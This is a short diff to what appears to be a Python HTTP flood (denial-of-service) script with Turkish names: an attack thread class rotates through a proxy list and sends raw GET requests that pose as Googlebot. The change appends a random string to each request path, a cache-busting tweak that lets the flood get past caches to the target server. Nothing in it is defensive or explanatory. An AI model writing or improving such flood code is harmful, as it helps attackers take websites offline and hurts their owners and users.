@@ -24,7 +24,7 @@ class Saldir(threading.Thread):
             proxy = ProxyListesi[current].split(':')
         else:
             proxy = random.choice(ProxyListesi).split(':')
-        Tarayici = "GET " + SiteLink + " HTTP/1.1\r\n"\
+        Tarayici = "GET " + SiteLink + random_str_2(10) + " HTTP/1.1\r\n"\
 		"Host: " + HostLink + "\r\n"\
 		"Accept-Encoding: deflate,br\r\n"\
 		"User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\r\n"\
